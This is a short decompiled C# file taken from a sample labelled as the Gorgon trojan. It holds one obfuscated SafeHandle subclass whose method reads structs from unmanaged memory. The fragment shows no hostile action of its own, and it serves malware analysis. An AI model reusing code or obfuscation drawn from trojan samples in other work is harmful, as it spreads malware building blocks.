// Decompiled with JetBrains decompiler
// Type: bU3UFpKp94ySW.AUmoMqznwZmkP
// Assembly: Udby4Jt48oXkJ, Version=3.17.2.31, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 37899E89-D673-4F5B-A193-2E4DF6A54096
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-bf535869266eca7a958714acade2ede1bff0e73f0aaa2702f389ededee6a8d6a.exe

using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.InteropServices;
using System.Security;

namespace bU3UFpKp94ySW
{
  internal sealed class AUmoMqznwZmkP : SafeHandleZeroOrMinusOneIsInvalid
  {
    internal AUmoMqznwZmkP()
      : base(true)
    {
    }

    [SecurityCritical]
    internal unsafe T pqlSLx7JMeioJ<T>(uint kIPCfTRJC6X1D) where T : struct
    {
      uint num = checked ((uint) Marshal.SizeOf(typeof (T)));
      if ((long) num % (long) UIntPtr.Size != 0L)
        checked { num += (uint) ((long) UIntPtr.Size - unchecked ((long) num % (long) UIntPtr.Size)); }
      return (T) Marshal.PtrToStructure(new IntPtr(new UIntPtr(checked (new UIntPtr(this.handle.ToPointer()).ToUInt64() + (ulong) (num * kIPCfTRJC6X1D))).ToPointer()), typeof (T));
    }

    protected override bool ReleaseHandle()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
